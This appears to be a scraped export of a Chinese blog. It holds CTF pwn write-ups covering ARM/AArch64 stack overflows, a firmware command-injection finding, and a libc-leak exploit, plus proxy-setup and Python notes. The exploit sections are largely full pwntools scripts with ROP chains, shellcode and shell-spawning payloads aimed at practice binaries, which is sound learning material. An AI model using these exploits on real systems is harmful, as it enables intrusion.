flat([0x400e96,0,0,1,puts_got,0,0,puts_got,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# leak libc\nlibc_base = u64(pr.recvline()[:-1].ljust(8,'\\x00')) - mylibc.symbols['puts']\n\n\n# 5\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,0x40,0x6020e0,0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write open,write,/flag to 0x6020e0,0x6020e8,0x6020f0\nopen_addr = libc_base + mylibc.symbols['open']\nwrite_addr = libc_base + mylibc.symbols['write']\ncont1 = flat([open_addr,write_addr,'/flag'])\npr.send(cont1)\n\n\n# 6 \nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e0,0x0,0x0,0x6020f0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# fd = open('/flag',0),fd = 3?\n\n\n# 7 \nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,100,0x602110,3,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# read(3,0x602110,100)\n\n\n# 8\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e8,100,0x602110,1,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write(1,0x602110,100)\n\nres = pr.recvline()\nprint res\n\npr.interactive()\n```\n\n# blinkblink\n\n题目文件：[blinkblink](BlinkBlink_200.zip)\n\n## 尝试访问\n\nnc连上给的ip \n\n![](blinkblink1.png)\n\n浏览器打开\n\n![](blinkblink2.png)\n\n尝试登陆，查看网页文件源码\n\n![](blinkblink3.png)\n\n发现getinfo.js中有url，尝试访问\n\n![](blinkblink4.png)\n\n有返回值\n\n![](blinkblink5.png)\n\n该js中有144个url\n\n![](blinkblink6.png)\n\n## 分析本地固件包\n\n下载下来的固件包用binwalk解包，找到了login.asp以及getinfo.js\n\n![](blinkblink7.png)\n\n除了getinfo.js，还在goahead中找到有\n\n![](blinkblink8.png)\n\ngoahead是一个嵌入式web服务器：https://www.embedthis.com/goahead/\n\nIDA分析goahead，查找字符串’set_qos_cfg’，找到如下引用\n\n![](blinkblink9.png)\n\n继续查看对该函数的引用\n\n![](blinkblink10.png)\n\n这里的接口比getinfo.js中的要多，发现一个cmd，很可疑：\n\n![](blinkblink11.png)\n\n跟进sub_44d41c\n\n![](blinkblink12.png)\n\n经过查找，bs_SetCmd函数的定义在libshare-0.0.26.so中。该函数将cmd键对应的值直接执行，\n\n![](blinkblink13.png)\n\n尝试访问\n\n![](blinkblink14.png)","categories":["CTF"]},{"title":"arm pwn 入门","url":"/2021/01/27/arm-pwn-start/","content":"\n# arm pwn基本技能\n\n## qemu调试arm用户态程序\n\n```shell\n# 使用qemu-arm将程序运行起来，并指定一个端口用于连接gdb\nqemu-arm -g xxx ./arm-bin\n\n# 使用gdb-multiarch指定arm程序\ngdb-multiarch ./arm-bin\ngef> set architecture arm\ngef> set endian little\ngef> target remote :xxx\n\n# gdb-multiarch指定config文件\ngdb-multiarch -x mygdb.cfg ./arm-bin\n```\n\n调试mips程序的设置也类似\n\n```shell\n# 启动mips应用程序，并指定调试端口\nqemu-mips -g xxx ./mips-bin\nqemu-mips -g xxx -L ./ ./mips-bin  # 使用-L指定包含动态库的lib/目录\n\n# gdb-multiarch启动调试\ngdb-multiatch ./mips-bin\ngef> set architecture mips\ngef> set endian big\ngef> target remote :xxx\n```\n\n## 安装arm64的lib库\n\n```shell\nsudo apt search \"libc6-\" | grep \"arm\"\nsudo apt install libc6-arm64-cross\n# 安装好的库/usr/aarch64-linux-gnu/lib/目录下\n```\n\n`qemu-aarch64`执行时通过`-L`指定`/usr/aarch64-linux-gnu`目录即可，如：\n\n```shell\nqemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn\n```\n\n# 练习题 - typo\n\n题目文件：[typo](typo)\n\n## 分析\n\n查看文件属性，arm32位可执行程序，静态连接，去符号表。\n\n查看编译选项，栈无canary但栈不可执行，程序未开启随机化故加载基址固定。\n\n```shell\nbling@Ubuntu2004:~/ctf$ file ./typo\n./typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n\nbling@Ubuntu2004:~/ctf$ checksec --file=./typo\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\t\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH \nSymbols\t\tFORTIFY\tFortified\tFortifiable  FILE\nNo Symbols      No\t0\t\t0\t./typo\n```\n\n通过start()函数或关键字符串的交叉引用来寻找main()函数。\n\n- start函数中LDR R0,=sub_8F00中的sub_8F00就是main函数\n\n  ```shell\n  .text:00008BB4                 PUSH    {R12}\n  .text:00008BB8                 LDR     R0, =sub_8F00\n  .text:00008BBC                 LDR     R3, =0xA5EC\n  .text:00008BC0                 BL      sub_9EBC\n  .text:00008BC4                 BL      sub_F0E0\n  .text:00008BC4 ; End of function start\n  ```\n\n- 关键字符串，如运行时打印的`Let's Do Some Typing Exercise~`，在IDA中寻找对该字符串的引用\n\n对于这种输入类的题，首先想到的是输入一个超长字符串看程序会不会崩。果然崩掉了。\n\n```shell\n$ qemu-arm ./typo\nLet's Do Some Typing Exercise~\nPress Enter to get start;\nInput ~ if you want to quit\n\n------Begin------\nconsequently\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nqemu: uncaught target signal 11 (Segmentation fault) - core dumped\nSegmentation fault (core dumped)\n```\n\n使用gdb-multiarch调试一下崩溃位置，是否覆盖了返回地址\n\n- qemu-arm侧\n\n  ```shell\n  $ qemu-arm -g 1234 ./typo\n  ```\n\n- gdb-multiarch侧\n\n  ```shell\n  $ gdb-multiarch ./typo\n  GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1\n  pwndbg> set architecture arm\n  The target architecture is assumed to be arm\n  pwndbg> set endian little\n  The target is assumed to be little endian\n  pwndbg> target remote :1234\n  Remote debugging using :1234\n  ```\n\n  这里在gdb内设置的set和target remote都可以写在一个配置文档里，通过`gdb-multiarch -x abc.cfg`指定。\n\n- pwntools生成字符串pattern\n\n  ```shell\n  >>> from pwn import *\n  >>> cyclic(200)\n  'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'\n  ```\n\n接下来：\n\n1. gdb-multiarch内执行`c`\n\n2. qemu-arm界面，回车后，将上述200个字符输入\n\n3. 回到gdb-multiarch界面，可以看到如下寄存器信息，PC指针被我们的输入覆盖了\n\n   ```shell\n   ─────────────────────────────────[ REGISTERS ]──────────────────────────────────\n    R0   0x0\n   *R1   0xfffeeed4 ◂— 0x61616161 ('aaaa')\n   *R2   0x7e\n    R3   0x0\n   *R4   0x62616162 ('baab')\n    R5   0x0\n    R6   0x0\n    R7   0x0\n    R8   0x0\n   *R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}\n   *R10  0xa68c ◂— push   {r3, r4, r5, lr}\n   *R11  0x62616163 ('caab')\n    R12  0x0\n   *SP   0xfffeef48 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\\n'\n   *PC   0x62616164 ('daab')\n   ```\n\n4. 在pwntools中确定`'daab'`的偏移量，为112\n\n   ```sh\n   >>> cyclic_find('daab')\n   112\n   ```\n\n5. 因此，我们通过padding 112个字符，就能覆盖函数返回地址，劫持控制流\n\n## 利用\n\n### 方法1 - ret2shellcode\n\n> [现成的shellcode](http://shell-storm.org/shellcode/)\n\n### 方法2 - rop：svc\n\n> svc：id=0xb；R0=addr(\"/bin/sh\")；R1=0；R2=0 \n>\n> 以上系统调用等同于execve(\"/bin/sh\",0,0)\n\n找到`/bin/sh`字符串地址：\n\n```shell\n$ ROPgadget --binary ./typo --string /bin/sh\nStrings information\n============================================================\n0x0006c384 : /bin/sh\n```\n\n找ropgadget：\n\n```shell\n$ ROPgadget --binary ./typo --only \"pop\"\nGadgets information\n============================================================\n0x00008d1c : pop {fp, pc}\n0x00020904 : pop {r0, r4, pc}\n0x00068bec : pop {r1, pc}\n0x00008160 : pop {r3, pc}\n0x0000ab0c : pop {r3, r4, r5, pc}\n0x0000a958 : pop {r3, r4, r5, r6, r7, pc}\n0x00008a3c : pop {r3, r4, r5, r6, r7, r8, fp, pc}\n0x0000a678 : pop {r3, r4, r5, r6, r7, r8, sb, pc}\n0x00008520 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}\n0x00068c68 : pop {r3, r4, r5, r6, r7, r8, sl, pc}\n0x00014a70 : pop {r3, r4, r7, pc}\n0x00008de8 : pop {r4, fp, pc}\n0x000083b0 : pop {r4, pc}\n0x00008eec : pop {r4, r5, fp, pc}\n0x00009284 : pop {r4, r5, pc}\n0x000242e0 : pop {r4, r5, r6, fp, pc}\n0x000095b8 : pop {r4, r5, r6, pc}\n0x000212ec : pop {r4, r5, r6, r7, fp, pc}\n0x000082e8 : pop {r4, r5, r6, r7, pc}\n0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}\n0x00011648 : pop {r4, r5, r6, r7, r8, pc}\n0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}\n0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}\n0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}\n0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}\n0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}\n0x00023ed4 : pop {r4, r5, r7, pc}\n0x00023dbc : pop {r4, r7, pc}\n0x00014068 : pop {r7, pc}\n\nUnique gadgets found: 29\n```\n\n找`svc`：\n\n```shell\n$ ROPgadget --binary ./typo | grep 'svc #0'\n0x0001aca8 : svc #0 ; pop {r4, r5, r6, r7, r8, pc}\n0x00019568 : svc #0 ; pop {r4, r5, r6, r7, r8, sb, pc}\n0x000482fc : svc #0 ; pop {r7} ; bx lr\n0x00048310 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n0x000482fc : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n0x00048324 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n......\n```\n\n找`mov`指令：\n\n```shell\n$ ROPgadget --binary ./typo | grep 'mov r2, r4'\n0x0003338c : mov r2, r4 ; blx r3\n0x0000f600 : mov r2, r4 ; blx sb\n0x00069950 : mov r2, r4 ; mov r3, r4 ; blx r8\n0x00013310 : mov r2, r4 ; mov r3, r5 ; blx r1\n......\n```\n\n我们的最终目标是：\n\n- R0 = \"/bin/sh\"\n- R1 = 0\n- R2 = 0\n- R7 = 0xb （对应arm下execve的系统调用）\n- Rx = svc\n\n根据目标，构造了如下rop链：\n\n```shell\ng1 - 0x00020904 : pop {r0, r4, pc}\ng2 - 0x00068bec : pop {r1, pc}\ng3 - 0x00023dbc : pop {r4, r7, pc}\ng4 - 0x00008160 : pop {r3, pc}\ng5 - 0x0003338c : mov r2, r4 ; blx r3\n====stack high====\ng5\n0x0001aca8\t\t# \"svc\"地址\ng4\n0xb\n0\ng3\n0\ng2\n0\n0x0006c384\t\t# \"/bin/sh\"字符串地址\ng1\n====stack low====\n```\n\n以上rop链对应的payload为：\n\n```shell\npayload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)\n```\n\n完整exp如下：\n\n```shell\nfrom pwn import *\ncontext(arch='arm',log_level='debug')\n\nmyproc = process(['qemu-arm','./typo'])\n\nmyproc.recvuntil(\"quit\\n\")\nmyproc.send(\"\\n\")\n\npayload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)\nexp = 'a'*112 + payload\n\nmyproc.recv()\nmyproc.sendline(exp)\n\nmyproc.interactive()\n```\n\n### 方法3 - rop：func(\"/bin/sh\")\n\n> system(\"/bin/sh\") 或者 execve(\"/bin/sh\",0,0)\n>\n> 使用类似pop {r0,pc}的gadget，实现对r0（第一个参数）和pc的控制，从而劫持控制流到**system(\"/bin/sh\")**\n\n# 练习题 - pwn\n\n题目文件：[pwn](pwn)\n\n## 分析\n\n查看文件属性、IDA逆向二进制文件分析后，调试结果如下：\n\n- 程序有两次输入。第一次输入将被放到bss段，限制了输入大小为0x200。这里没有问题。\n\n- 第二次输入时，将输入0x200字节的数据给栈上的局部变量。如下所示，明显的栈溢出。\n\n  ```c\n  ssize_t sub_4007F0()\n  {\n    __int64 v1; // [xsp+10h] [xbp+10h] BYREF\n  \n    return read(0, &v1, 0x200uLL);\n  }\n  ```\n\n- 因此尝试调试输入超长字符串是否能成功覆盖返回地址，劫持pc指针。如下证明输入确实控制了pc。\n\n  ```shell\n  ─────────────────────────────────[ REGISTERS ]──────────────────────────────────\n   X0   0x0\n  *X1   0x40007ffdb0 ◂— 0x6161616261616161 ('aaaabaaa')\n  *X2   0x200\n  *X3   0x40009a21a8 ◂— 0x0\n   X4   0x0\n   X5   0x0\n  *X6   0x400099eb00 ◂— 0x0\n  *X7   0x4000000000\n  *X8   0x3f\n  *X9   0xffffffffffff\n  *X10  0x101010101010101\n   X11  0x0\n   X12  0x0\n  *X13  0x400082e048 —▸ 0x400082f1b0 ◂— 0x0\n  *X14  0x400085a308 ◂— 0x70737274735f5f00\n  *X15  0x400084ce08 ◂— 0x0\n  *X16  0x411028 —▸ 0x400090b9c8 ◂— 0xb0000483a9bd7bfd\n  *X17  0x400090b9c8 ◂— 0xb0000483a9bd7bfd\n  *X18  0x367\n  *X19  0x400868 ◂— stp    x29, x30, [sp, #-0x40]!\n   X20  0x0\n  *X21  0x400610 ◂— movz   x29, #0\n   X22  0x0\n   X23  0x0\n   X24  0x0\n   X25  0x0\n   X26  0x0\n   X27  0x0\n   X28  0x0\n  *X29  0x6161617261616171 ('qaaaraaa')\n  *SP   0x40007ffe00 ◂— 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaac\\n'\n  *PC   0x6161617461616173 ('saaataaa')\n  ```\n\n- 确定偏移量，为72\n\n  ```shell\n  >>> cyclic_find('saaa')\n  72\n  ```\n\n## 利用\n\n### 标准qemu上\n\n**ret2shellcode**\n\n```python\nfrom pwn import *\ncontext(log_level='debug',arch='aarch64')\nio = process([\"qemu-aarch64\", \"-L\", \"/usr/aarch64-linux-gnu\",\"./pwn\"])\n\npayload =  \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\npayload += \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\npayload += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nio.sendlineafter(\"Name\",payload)\nio.sendline(b'a'*72+p64(0x411068))\nio.interactive()\n```\n\n[shellcode来源](https://www.exploit-db.com/shellcodes/47048)\n\n### 补丁qemu上\n\n补丁qemu上，bss段不可执行。考虑使用`mprotect()` 函数将bss段设置为可读可写可执行。\n\n```c\n#include <unistd.h>\n#include <sys/mmap.h>\nint mprotect(const void *start, size_t len, int prot);\n// 把自start开始的、长度为len的内存区的保护属性修改为prot指定的值\n// 可读可写可执行时prot应当为7\n```\n\n**ret2csu**\n\narm下的ret2csu可以实现两次控制流劫持：1、从0x4008cc处进入，通过布置好栈空间控制x19~x30内的几个寄存器，并将x30设置为0x4008ac，从而使程序执行上面这段gadget；2、进入0x4008ac后，w0/x1/x2/x3都会被栈空间的值给覆盖，将x3设置为目标地址，可以实现**第一次控制流劫持**；3、`blr x3`返回后继续往下执行，如果此时x19和x20的值相同，就又会执行到0x4008cc；4、此时，通过布置栈空间可以再次控制x30，当执行到ret时，就实现了**第二次控制流劫持**。\n\n```assembly\n.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j\n.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]\n.text:00000000004008B0                 MOV             X2, X22\n.text:00000000004008B4                 MOV             X1, X23\n.text:00000000004008B8                 MOV             W0, W24\n.text:00000000004008BC                 ADD             X19, X19, #1\n.text:00000000004008C0                 BLR             X3\n.text:00000000004008C4                 CMP             X19, X20\n.text:00000000004008C8                 B.NE            loc_4008AC\n.text:00000000004008CC\n.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j\n.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]\n.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]\n.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]\n.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40\n.text:00000000004008DC                 RET\n```\n\n画个图表示一下实现两次控制流劫持时，栈空间的布局。x29处是低地址，x24处是高地址。\n\n```\n           第 一 段 栈 空 间\n\n +----+     +-----+\n | x0 +<----+ x24 |\n +----+     +-----+\n | x1 +<----+ x23 |\n +----+     +-----+\n | x2 +<----+ x22 |\n +----+     +-----+\n | x3 +<----+ x21 |   注 意 ， 这 里 是 取 [x21] 给 x3\n +----+     +-----+\n | 1  +<----+ x20 |\n +----+     +-----+\n | 0  +<----+ x19 |\n +----+     +-----+      +----------------------------+\n            | x30 +----->+ 上 一 段 gadget，偏 移 0x20左 右   |\n            +-----+      +----------------------------+\n            | x29 +----->+ anything                   |\n            +-----+      +----------------------------+\n\n\n\n           第 二 段 栈 空 间\n\n+-----+      +---------------------------------+\n| x24 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x23 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x22 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x21 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x20 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x19 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x30 +----->+ 下 一 个 目 标 跳 转 地 址 , 如 shellcode |\n+-----+      +---------------------------------+\n| x29 +----->+ anything                        |\n+-----+      +---------------------------------+\n```\n\n整理一下利用思路：\n\n- 第一次输入将shellcode放入bss段\n\n- 第二次输入时溢出覆盖返回地址（至ret2csu），并布置好栈空间\n  1. 第一段栈空间实现跳转到下一个gadget，并将关键寄存器赋值\n  2. 第二段栈空间实现一个跳转，一般是跳到shellcode或某个关键函数地址上执行\n\n接下来，只需要对照着IDA仔细地将栈空间布置好，就可以了。exp如下\n\n```python\nfrom pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n# myproc = process(['qemu-aarch64','-g','1234','-L','/usr/aarch64-linux-gnu/','./pwn'])\nmyproc = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','./pwn'])\n\nshellcode = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nshellcode += \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nshellcode += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\ninput1 = shellcode.ljust(0x50,'\\x00') + p64(0x4007e0)\n\n# 函数返回时，栈空间的SP指向栈中“返回地址的上一个”，因此构造的栈紧挨着覆盖的返回地址处\npadding_func = 'a'*72 + p64(0x4008cc)\nstack1 = flat([0x0,0x4008ac,0x0,0x1,0x411068+0x50,0x7,0x1000,0x411000])\nstack2 = flat([0x0,0x411068,0x0,0x0,0x0,0x0,0x0,0x0])\n\ninput2 = padding_func + stack1 + stack2\nmyproc.sendafter('Name:',input1)\nmyproc.sendline(input2)\nmyproc.interactive()\n```\n\n# 练习题 - melong\n\n题目文件：[melong.zip](melong.zip)\n\n## 分析\n\n`write_diary()`函数中，read()的第三个参数nbytes来自于函数参数。a2是main()函数中的一个局部变量。\n\n```c\nDWORD *__fastcall write_diary(_DWORD *result, void *a2)\n{\n  unsigned __int8 nbytes; // [sp+Fh] [bp-5h]\n\n  nbytes = *result;\n  if ( nbytes )\n  {\n    read(0, a2, nbytes);\n    result = (_DWORD *)printf(\"you wrote %s\\n\", (const char *)a2);\n  }\n  return result;\n}\n```\n\n跟踪到上一级，来自v8[0]，它是PT()函数的返回值。\n\n```c\n          v8[0] = PT(v3);\n        else\nLABEL_5:\n          check_first(v3);\n        continue;\n      case 4:\n        if ( v8[0] )\n          write_diary(v8, v5);\n```\n\nPT()函数内部，当`ptr == exc2`时，返回值为输入的size。\n\n```c\n _isoc99_scanf(\"%d\", &size);\n  ptr = malloc(size);\n  if ( ptr == (void *)exc2 )\n  {\n    puts(\"Okay, start to exercise!\");\n    for ( i = 0; i < (int)size; ++i )\n    {\n      puts(\"you are getting healthy..\");\n      sleep(1u);\n    }\n    free(ptr);\n    v0 = size;\n  }\n......\n  return v0;\n```\n\n因此，只要控制`ptr == exec2`，就可以在`write_diary()`函数中，利用`read(0, a2, nbytes)`达到栈溢出覆盖返回地址的目的。\n\n> exec2是bss段的值，初始化为0。因此，当malloc(size)执行失败时，就可以达到ptr == exec2的目的。\n\n## 利用\n\n### 方法1 - ret2shellcode\n\nexp如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"arm\",log_level=\"debug\")\n\npr = process(['qemu-arm','-L','./','./melong'])\n#pr = process(['qemu-arm','-g','1234','-L','./','./melong'])\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(1))\npr.recvuntil(\"Your height(meters) : \")\npr.sendline(str(1.65))\npr.recvuntil(\"Your weight(kilograms) : \")\npr.sendline(str(100))\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(3))\npr.recvuntil(\"training?\")\npr.sendline(str(-1))\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(4))\n\nshellcode  = \"\\x02\\x20\\x42\\xe0\\x1c\\x30\\x8f\\xe2\"\nshellcode += \"\\x04\\x30\\x8d\\xe5\\x08\\x20\\x8d\\xe5\"\nshellcode += \"\\x13\\x02\\xa0\\xe1\\x07\\x20\\xc3\\xe5\"\nshellcode += \"\\x04\\x30\\x8f\\xe2\\x04\\x10\\x8d\\xe2\"\nshellcode += \"\\x01\\x20\\xc3\\xe5\\x0b\\x0b\\x90\\xef\"\nshellcode += \"/bin/sh\"\npayload = shellcode + 'a'*(84-len(shellcode))\npayload += p32(0xfffeef10)\npr.sendline(payload)\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(6))\n\npr.interactive()\n```\n\n### 方法2 - 泄露libc与getshell分开\n\n泄露libc：\n\n- 利用代码段中 的bl puts，构造puts(puts_got)\n\n- 利用puts的plt项，puts(puts_got)\n- ~~libc中的puts()函数也是可执行的，但是由于libc基址还未泄露，不适用于这里使用~~\n\ngetshell：\n\n- libc中寻找system和“/bin/sh”\n\n- system(\"/bin/sh\")\n\n### 方法3 - 泄露libc与getshell二合一\n\n在代码段寻找特殊`bl puts`代码，如0x110bc处。特殊之处在于，执行完puts后，会pop {r11,pc}，这样我们就可以继续控制pc。\n\n- 利用`bl puts`泄露libc\n- 利用0x110c4处的pop将控制流重新劫持到main，当再次栈溢出时控制执行system(\"/bin/sh\")\n\n```assembly\n.text:000110B0 check_first                             ; CODE XREF: main+10C↓p\n.text:000110B0                                         ; main+140↓p\n.text:000110B0                 PUSH    {R11,LR}\n.text:000110B4                 ADD     R11, SP, #4\n.text:000110B8                 LDR     R0, =aCheckBmiFirst ; \"Check bmi first\"\n.text:000110BC                 BL      puts\n.text:000110C0                 NOP\n.text:000110C4                 POP     {R11,PC}\n```\n\n完整exp如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"arm\",log_level=\"debug\")\n\nmyelf = ELF('./melong')\nmylibc = ELF('./lib/libc.so.6')\npr = process(['qemu-arm','-L','./','./melong'])\n#pr = process(['qemu-arm','-g','1234','-L','./','./melong'])\n\ndef myfunc(val1,val2,val3,val4):\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(1))\n    pr.recvuntil(\"Your height(meters) : \")\n    pr.sendline(str(1.65))\n    pr.recvuntil(\"Your weight(kilograms) : \")\n    pr.sendline(str(100))\n\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(3))\n    pr.recvuntil(\"training?\")\n    pr.sendline(str(-1))\n\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(4))\n\n    payload = 'a'*84\n    payload += p32(0x11bbc) + p32(val1) + p32(val2) + p32(val3) + p32(val4)\n    pr.sendline(payload)\n\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(6))\n\n\n# first time - leak libc and return to main\nmyfunc(0x2301c,0x110bc,0x0,0x110cc)    # 0x2301c:puts_got; 0x110bc:bl puts; 0x110cc:main\npr.recvline()\nlibc_puts = u32(pr.recvline()[:4])\nlibc_base = libc_puts - mylibc.symbols['puts']\n#log.warn(\"puts_libc: 0x{:x}\".format(libc_puts))\n#log.warn(\"libc_base: 0x{:x}\".format(libc_base))\nsys_addr = libc_base + mylibc.symbols['system']\nbinsh_addr = libc_base + 0x131bec\n\n# second time - system(\"/bin/sh\")\nmyfunc(binsh_addr,sys_addr,0x0,0x0)\n\npr.interactive()\n```\n\n## 参考wp\n\n[ARM pwn入门](http://www.hackpluto.xyz/2020/04/26/ARM-pwn%E5%85%A5%E9%97%A8/#Codegate2018-melong)\n\n[ARM架构下的 Pwn 的一般解决思路](https://www.anquanke.com/post/id/199112#h3-18)\n\n# pwndbg常用指令\n\n```shell\ni r lr   # 查看lr寄存器的值\np $lr    # 打印lr寄存器的值（十进制）\n```","categories":["CTF"]},{"title":"Linux下的各种代理设置","url":"/2021/01/26/configure-proxy/","content":"\n## http代理\n\n> socks代理的话，把http换成socks或者socks5就可以了\n\n- proxychains\n\n```shell\nsudo apt search proxychains\nsudo apt install xxx\nvim /etc/proxychains.conf\t# 修改配置文件，设置代理\n```\n\n- export环境变量\n\n```shell\n# 设置\nexport http_proxy=ip:port\nexport https_proxy=ip:port\n## 如果代理服务器需要登录：\nexport http_proxy=http://userName:password@proxyAddress:port\nexport https_proxy=http://userName:password@proxyAddress:port\n\n# 取消设置\nunset http_proxy \n## 或 \nunset https_proxy\n\n# 永久加入\n## 在shell配置文件.bashrc或者.zshrc中添加上述内容\nvim ~/.bashrc\n```\n\n\n\n## git代理\n\n- 设置 - 有用户名密码\n\n```sh\ngit config --global user.name \"blingxxxxuanxxx\"\ngit config --global user.email \"xxx@163.com\"\nssh-keygen -t rsa -b 4096 -C \"xxx@163.com\"\ngit config --global http.proxy http://用户名:密码@ip:port\ngit config --global https.proxy http://用户名:密码@ip:port\ngit config --global http.sslVerify false\n```\n\n- 设置 - 无用户名密码情况\n\n```shell\ngit config --global http.proxy http://ip:port\ngit config --global https.proxy http://ip:port\n```\n\n- 查看代理：\n\n```shell\ngit config --global --get http.proxy\ngit config --global --get https.proxy\n```\n\n- 取消代理\n\n```shell\ngit config --global --unset http.proxy\ngit config --global --unset https.proxy\n```\n\n- 其他命令\n\n```shell\ngit config --list\n```\n\n\n\n## pip 代理\n\n使用 `--proxy=代理服务器IP:端口` 的方式：\n\n```shell\nsudo /usr/bin/python3.6 -m pip --proxy=http://192.168.56.1:808 install --target /usr/local/lib/python3.6/dist-packages -Ur requirements.txt\n```\n\n\n\n## gem 代理\n\n找到gem文件位置，打开gem文件，在begin下添加args并配置代理：\n\n```shell\nbling@Ubuntu2004:~$ which gem\n/usr/bin/gem\nbling@Ubuntu2004:~$ vim /usr/bin/gem\nbegin\n  args += ['--http-proxy','http://x.x.x.x:port']\t\t# 添加这一句\n  Gem::GemRunner.new.run args\nrescue Gem::SystemExitException => e\n  exit e.exit_code\nend\n```","categories":["基础技能"]},{"title":"python3 学习","url":"/2021/01/23/study-python3/","content":"\n花了一天，参考W3Cschool学了下python3的基础，做了个笔记给自己看。\n\n# 探索\n\n## python3下字符串、bytes、hex之间的转换\n\n```\n      \"\".encode()                 b\"\".hex()\n  +----------------+     +- ------------------------+\n  |                |     |                          |\n  |                |     |                          |\n+-+--+           +-v-----+-+                  +-----v-----+\n| \"\" |           |  bytes  |                  |  hex str  |\n+-^--+           +-+-----^-+                  +-----+-----+\n  |                |     |                          